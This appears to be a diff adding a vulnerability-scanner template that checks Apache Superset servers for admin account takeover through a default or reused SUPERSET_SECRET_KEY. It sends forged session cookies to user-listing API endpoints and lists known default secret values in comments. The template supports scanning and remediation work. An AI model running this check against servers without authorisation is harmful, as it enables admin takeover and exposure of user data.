@@ -1,0 +1,45 @@
+id: apache-superset-adminaccounttakeover
+
+info:
+  name: Apache Superset - Admin Account Takeover
+  author: icarot
+  severity: high
+  description: |
+    Reuse or predictable SUPERSET_SECRET_KEY value on Apache Superset server leads to account takeover of the admin user. Flask session tokens generated to the user account "admin".
+  reference:
+    - https://lists.apache.org/thread/pydlykgbsb9bjlnt8g789pjw7k8rt2ht
+    - https://superset.apache.org/docs/security/securing_superset/
+  metadata:
+    max-request: 10
+  tags: apache,superset,account-takeover
+
+http:
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: session={{token}}
+
+    attack: clusterbomb
+    payloads:
+        path:
+          - "/api/v1/security/users/"
+          - "/users/list/"
+        token: defaultSupersetSecretKeySessionCookie.txt
+          #"SUPERSET_SECRET_KEY=your_secret_key_here". Discovered at: https://github.com/apache/superset/
+          #"SUPERSET_SECRET_KEY=TEST_NON_DEV_SECRET". Discovered at: https://github.com/apache/superset/blob/master/docker/.env
+          #"SUPERSET_SECRET_KEY=YOUR_OWN_RANDOM_GENERATED_SECRET_KEY". Discovered at: https://github.com/apache/superset/blob/master/docs/docs/configuration/configuring-superset.mdx and https://superset.apache.org/docs/configuration/configuring-superset
+          # "SUPERSET_SECRET_KEY=\u0002\u0001thisismyscretkey\u0001\u0002\\e\\y\\y\\h". Discovered at: https://github.com/d0ge/sign-saboteur/blob/main/src/main/resources/secrets
+          # "SUPERSET_SECRET_KEY=thisISaSECRET_1234". Discovered at: https://github.com/d0ge/sign-saboteur/blob/main/src/main/resources/secrets
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"email":'
+          - '"first_name":'
+        condition: and
+
+      - type: status
+        status:
+          - 200
